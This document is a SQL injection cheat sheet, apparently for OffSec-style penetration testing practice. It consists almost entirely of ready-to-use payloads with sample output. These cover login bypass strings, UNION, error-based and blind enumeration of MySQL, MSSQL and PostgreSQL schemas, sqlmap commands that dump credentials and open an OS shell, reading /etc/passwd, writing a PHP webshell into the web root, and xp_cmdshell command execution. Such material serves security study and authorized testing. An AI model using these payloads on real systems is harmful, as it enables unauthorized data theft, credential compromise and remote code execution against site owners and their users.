# SQL INJECTION

### Test for SQLi

Try in every input field — Look for errors or behavior change

```bash
' OR 1=1-- -
" OR 1=1-- -
' OR '1'='1
1' ORDER BY 1-- -
```

<details>
<summary>Example Output</summary>

```
Input: ' OR 1=1-- -

Response shows ALL users instead of one
OR: Error: You have an error in your SQL syntax near '''
OR: Page content changes between ' OR 1=1-- - and ' OR 1=2-- -
(SQLi CONFIRMED)
```
</details>

---

### LAB ONLY - SQLMap automated

NOT ALLOWED ON OFFSEC EXAMS. Automated SQLi — Enumerate databases

```bash
sqlmap -u 'http://$IP/page.php?id=1' --batch --dbs
```

<details>
<summary>Example Output</summary>

```
sqlmap -u 'http://10.10.10.5/page.php?id=1' --batch --dbs
[INFO] the back-end DBMS is MySQL
available databases [3]:
[*] information_schema
[*] webapp
[*] mysql
(NOT ALLOWED ON OFFSEC EXAMS)
```
</details>

---

### LAB ONLY - SQLMap with POST data

NOT ALLOWED ON OFFSEC EXAMS. POST parameter injection — Login forms

```bash
sqlmap -u 'http://$IP/login.php' --data='user=admin&pass=test' --batch --dbs
```

<details>
<summary>Example Output</summary>

```
sqlmap -u 'http://10.10.10.5/login' --data='user=a&pass=b' --batch
[INFO] Parameter 'user' is vulnerable
Type: UNION query
(NOT ALLOWED ON OFFSEC EXAMS)
```
</details>

---

### LAB ONLY - SQLMap dump creds

NOT ALLOWED ON OFFSEC EXAMS. Dump user table — Usernames and hashes

```bash
sqlmap -u 'http://$IP/page.php?id=1' -D <db> -T users --dump
```

<details>
<summary>Example Output</summary>

```
sqlmap -D webapp -T users --dump
+-------+----------+
| admin | P@ssw0rd |
| john  | welcome1 |
(NOT ALLOWED ON OFFSEC EXAMS)
```
</details>

---

### LAB ONLY - SQLMap OS shell

NOT ALLOWED ON OFFSEC EXAMS. Get shell via SQLi — Direct RCE

```bash
sqlmap -u 'http://$IP/page.php?id=1' --os-shell
```

<details>
<summary>Example Output</summary>

```
sqlmap --os-shell
os-shell> whoami
www-data
os-shell> id
uid=33(www-data)
(NOT ALLOWED ON OFFSEC EXAMS)
```
</details>

---

### UNION based manual

Manual UNION injection — Identify column count first with ORDER BY

```bash
' UNION SELECT 1,2,3-- -
' UNION SELECT user(),database(),version()-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,2,3-- -
Page shows '2' and '3' in output

' UNION SELECT 1,user(),database()-- -
Shows: root@localhost and webapp
(Manual injection = exam legal)
```
</details>

---

### Read files via SQLi

Read files through injection — LFI via database

```bash
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -

root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www
(Read any file the DB user can access)
```
</details>

---

### Write webshell via SQLi

Write PHP shell — RCE if writable web root

```bash
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/cmd.php'-- -

Error? Try: INTO DUMPFILE instead of OUTFILE

curl http://10.10.10.5/cmd.php?cmd=id
uid=33(www-data)
(Requires FILE privilege and writable web root)
```
</details>

---

### Error-based injection

Force errors to leak data — When UNION doesn't work

```bash
' AND extractvalue(1,concat(0x7e,version()))-- -
```

<details>
<summary>Example Output</summary>

```
' AND extractvalue(1,concat(0x7e,version()))-- -

Error: XPATH syntax error: '~5.7.29-0ubuntu0.18.04.1'
(Version leaked through error message)
```
</details>

---

### Blind boolean SQLi

Different response = injectable — Slower but works when no output

```bash
' AND 1=1-- - (true)
' AND 1=2-- - (false)
```

<details>
<summary>Example Output</summary>

```
' AND 1=1-- -  -> Page loads normally (TRUE)
' AND 1=2-- -  -> Page is blank/different (FALSE)

' AND SUBSTRING(user(),1,1)='r'-- -  -> TRUE
' AND SUBSTRING(user(),1,1)='a'-- -  -> FALSE
(User starts with 'r' -> root)
```
</details>

---

### Time-based blind SQLi

If page delays = injectable — MySQL vs MSSQL syntax

```bash
' AND SLEEP(5)-- -
'; WAITFOR DELAY '0:0:5'-- -
```

<details>
<summary>Example Output</summary>

```
' AND SLEEP(5)-- -

Page takes 5 seconds to load = INJECTABLE

' AND IF(SUBSTRING(database(),1,1)='w',SLEEP(5),0)-- -
5 second delay -> first char is 'w'
(Slow but works when no visible output)
```
</details>

---

### Determine column count

Keep increasing until you get an error. Last working number = column count — Required before UNION injection

```bash
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
(increment until error)
```

<details>
<summary>Example Output</summary>

```
' ORDER BY 1-- -  -> OK
' ORDER BY 2-- -  -> OK
' ORDER BY 3-- -  -> OK
' ORDER BY 4-- -  -> ERROR
(3 columns in the query)
```
</details>

---

### Find displayed columns

See which numbers appear on page. Those columns show output. — Inject queries into visible columns

```bash
' UNION SELECT 1,2,3,4-- -
(match column count from ORDER BY)
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,2,3-- -

Page shows: 2 and 3 in the output
(Inject payloads into columns 2 and 3)
```
</details>

---

### Extract database version

MySQL: version()  MSSQL: @@version  PostgreSQL: version() — Confirms DB type

```bash
' UNION SELECT 1,version(),3-- -
' UNION SELECT 1,@@version,3-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,version(),3-- -

5.7.29-0ubuntu0.18.04.1
(MySQL 5.7.29 on Ubuntu)
```
</details>

---

### Extract current database

MySQL: database()  MSSQL: db_name() — Know which DB you're in

```bash
' UNION SELECT 1,database(),3-- -
' UNION SELECT 1,db_name(),3-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,database(),3-- -

Output: webapp
(Now enumerate tables in 'webapp' database)
```
</details>

---

### Extract current user

Check privilege level — DBA = more options

```bash
' UNION SELECT 1,user(),3-- -
' UNION SELECT 1,current_user,3-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,user(),3-- -

Output: root@localhost
(Root DB user = FILE privileges likely available)
```
</details>

---

### List all databases (MySQL)

All databases in one query — Find interesting databases

```bash
' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -

information_schema,mysql,performance_schema,webapp,secret_db
```
</details>

---

### List tables in database

All tables from target DB — Look for users/credentials tables

```bash
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='<dbname>'-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='webapp'-- -

users,posts,settings,sessions
```
</details>

---

### List columns in table

Column names from target table — Find username/password columns

```bash
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -

Output: id,username,password,email,role
(Now dump username and password columns)
```
</details>

---

### Dump table data

0x3a is colon separator — Extract credentials

```bash
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -

admin:$2y$10$abc123...,john:$2y$10$def456...,editor:password123
(Crack bcrypt hashes or use plaintext creds)
```
</details>

---

### MSSQL list databases

MSSQL uses different schema — MSSQL syntax

```bash
' UNION SELECT 1,name,3 FROM master..sysdatabases-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,name,3 FROM master..sysdatabases-- -

master
tempdb
model
msdb
webapp
HRDatabase
```
</details>

---

### MSSQL list tables

xtype U = user tables — MSSQL syntax

```bash
' UNION SELECT 1,name,3 FROM <dbname>..sysobjects WHERE xtype='U'-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,name,3 FROM webapp..sysobjects WHERE xtype='U'-- -

users
employees
config
sessions
```
</details>

---

### MSSQL list columns

Columns from target table — MSSQL syntax

```bash
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')-- -

id
username
password_hash
email
```
</details>

---

### PostgreSQL list databases

PostgreSQL syntax — Different from MySQL

```bash
' UNION SELECT 1,datname,3 FROM pg_database-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,datname,3 FROM pg_database-- -

postgres
template0
template1
webapp
```
</details>

---

### PostgreSQL list tables

Public schema tables — PostgreSQL syntax

```bash
' UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname='public'-- -
```

<details>
<summary>Example Output</summary>

```
' UNION SELECT 1,tablename,3 FROM pg_tables WHERE schemaname='public'-- -

users
posts
config
```
</details>

---

### Stacked queries (MSSQL)

MSSQL supports stacked queries — Direct RCE if sa user

```bash
'; EXEC xp_cmdshell 'whoami'-- -
```

<details>
<summary>Example Output</summary>

```
'; EXEC xp_cmdshell 'whoami'-- -

nt authority\system
(RCE as SYSTEM via MSSQL stacked queries)
```
</details>

---

### Second-order SQLi

Payload stored, executed later — When direct injection fails

```bash
Register user: admin'-- -
Then login or trigger profile update
```

<details>
<summary>Example Output</summary>

```
Register username: admin'-- -
Login with that account
Profile page shows: Welcome, admin
(Stored payload executed on profile load, bypassed auth)
```
</details>

---
